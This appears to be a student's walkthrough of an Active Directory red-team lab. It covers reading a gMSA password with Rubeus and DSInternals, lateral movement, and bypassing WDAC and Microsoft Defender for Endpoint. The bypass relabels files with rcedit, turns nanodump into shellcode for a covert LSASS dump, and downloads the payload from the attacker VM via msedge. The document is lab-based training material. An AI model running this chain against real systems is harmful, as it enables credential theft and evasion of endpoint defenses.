
Task 
• Enumerate gMSAs in the us.techcorp.local domain. 
• Enumerate the principals that can read passwords from any gMSAs. 
• Compromise one such principal and retrieve the password from a gMSA. 
• Find if the gMSA has high privileges on any machine and extract credentials from that machine. 
• Move laterally and extract credentials on us-jump bypassing MDE.


To enumerate gMSAs, we can use the ADModule

```
Get-ADServiceAccount -Filter *
```

Enumerate the Principals that can read the password blob:

```
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

Recall that we got secrets of provisioning svc from us-mailmgmt. Start a new process as the provisioningsvc user. Run the below command from an elevated cmd shell. Once again, using encoded parameters with ArgSplit.bat:

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:provisioningsvc /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

In the new cmd session, run the following commands to get the password blob:

```
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
```

![[Pasted image 20250318001632.png]]

Using the DSInternals module, lets decode the password and convert it to NTLM hash (as the clear-text password is not writable)

```
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
```

```
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
```

```
ConvertTo-NTHash –Password $decodedpwd.SecureCurrentPassword
```

Now we can start a new process with the privileges of jumpone:

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:jumpone /rc4:1260ca22c2a3b131c0d3041bcdfcbfab /opsec /force /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

![[Pasted image 20250318001822.png]]
Check for admin privileges on a machine in the target domain. Run the below commands in the process running with privileges of jumpone:

```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```
Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
```


![[Pasted image 20250318002018.png]]

We have administrative access to US-Jump7 machine as jumpone. We can now access us-jump7 using winrs or PowerShell Remoting. When trying this in lab, note the name of us-jump7 in your lab instance.

### Credentials Extraction on us-jump - MDE Bypass

Let us now test to see if an EDR is enabled on the target using Invoke-EDRChecker.ps1 as follows. Run the following command in the process spawned as jumpone:

```
. C:\AD\Tools\Invoke-EDRChecker.ps1
```

```
Invoke-EDRChecker -Remote -ComputerName us-jump7
```

![[Pasted image 20250318002235.png]]

We find that Microsoft Defender for Endpoint (MDE) is enabled on the target us-jump.

Use winrs to access us-jump:

We can access us-jump using winrs in the process running as jumpone that we started above:

```
winrs -r:us-jump7 cmd
```

![[Pasted image 20250318002421.png]]

To avoid detections using commonly used lolbas such as whoami.exe, we can use the set u / set username command to enumerate our current user using environment variables. Trying to execute a lolbas such as wmic results in a failure as follows:

Exiting the shell and enumerating WDAC status using Get-CimInstance cmdlet we find that WDAC has been enabled on us-jump.

```
winrs -r:us-jump7 "powershell Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard"
```

![[Pasted image 20250318002609.png]]

We can now attempt to copy and parse the WDAC config deployed on us-jump to find suitable bypasses and loopholes in the policy

```
dir \\usjump7.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity
```

```
copy \\usjumpX.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity\DG.bin.p7 C:\AD\Tools
```


![[Pasted image 20250318002742.png]]


We find a deployed policy named DG.bin.p7 / SiPolicy.p7b in the CodeIntegrity folder. Copy either policy binary back over to our studentVM.

Now spawn a new Powershell prompt on the student VM using Invisishell and import the CIPolicyParser.ps1 script to parse the copied policy binary.

```
. C:\AD\Tools\CIPolicyParser.ps1
```

```
ConvertTo-CIPolicy -BinaryFilePath C:\AD\Tools\DG.bin.p7 -XmlFilePath C:\AD\Tools\DG.bin.xml
```

![[Pasted image 20250318003312.png]]

![[Pasted image 20250318003413.png]]

This is a File Attribute Allow rule that allows a file (exe / dll) having the Product Name: "Vmware Workstation". We can attempt to abuse this rule by editing the File Attributes of an exe / dll of choice to match the Product Name mentioned. rcedit, is a tool that can be used to easily achieve this. 

MDE also has been enabled on us-jumpX as enumerated previously. We can now attempt to perform an LSASS dump on the target us-jump using a covert technique / tool to bypass MDE along with WDAC. We will be using the mockingjay POC (loader / dropper) along with nanodump shellcode to bypass MDE detections and perform a covert LSASS Dump.

To bypass WDAC we edit File Attributes to match the Product Name: "Vmware Workstation" on all required files (exe / dlls) of the mockingjay POC. Begin by editing File Attributes for all required mockingjay files using rcedit to match the Product Name: "Vmware Workstation" and zip all required contents as follows: 


NOTE: msvcp140.dll, vcruntime140.dll, vcruntime140_1.dll are mockingjay dependency DLLs (located at \windows\system32) which are transferred too because WDAC is enabled on the target and would block them, while mscorlib.ni.dll is the DLL with the free RWX section to perform Self Process Injection in.

```
cd C:\AD\Tools\mockingja
```

```
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\msvcp140.dll --set-version-string "ProductName" "Vmware Workstation"
```

```
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\vcruntime140.dll --set-version-string "ProductName" "Vmware Workstation"
```

```
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\vcruntime140_1.dll --set-version-string "ProductName" "Vmware Workstation"
```

```
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mockingjay.exe --set-version-string "ProductName" "Vmware Workstation"
```

```
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mscorlib.ni.dll --set-version-string "ProductName" "Vmware Workstation"
```

```
Compress-Archive -Path C:\AD\Tools\mockingjay\msvcp140.dll, C:\AD\Tools\mockingjay\vcruntime140.dll, C:\AD\Tools\mockingjay\vcruntime140_1.dll, C:\AD\Tools\mockingjay\mockingjay.exe, C:\AD\Tools\mockingjay\mscorlib.ni.dll -DestinationPath "C:\AD\Tools\mockingjay\mockingjay.zip"
```

![[Pasted image 20250318004034.png]]

Now convert nanodump into compatible  shellcode using donut along with the with the args: spoofcallstack (-sc), fork LSASS process before dumping (-f) and output the dump to a file named nano.dmp (-- write) to make it dump LSASS in a covert way.

NOTE: shellcode dosen't need to be edited using rcedit to bypass WDAC.

```
C:\AD\Tools\mockingjay\donut.exe -f 1 -p " -sc -f --write nano.dmp" -i C:\AD\Tools\mockingjay\nanodump.x64.exe -o C:\AD\Tools\mockingjay\nano.bin
```

![[Pasted image 20250318004119.png]]

Confirm that the mockingjay poc and nano.bin shellcode is undetected by AV using AmsiTrigger / DefenderCheck:

Now host mockingjay.zip and nano.bin on our student VM using HFS. Make sure firewall is disabled before doing so. From the process running with privileges of jumpone, connect to us-jumpX and then download mockingjay.zip using msedge. 

NOTE: Using commonly abused binaries such as certutil for downloads, will result in a 
detection on MDE. Wait a few seconds for the download to complete.

```
 winrs -r:us-jump7 cmd
```

```
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --incognito http://192.168.100.139/mockingjay.zip
```
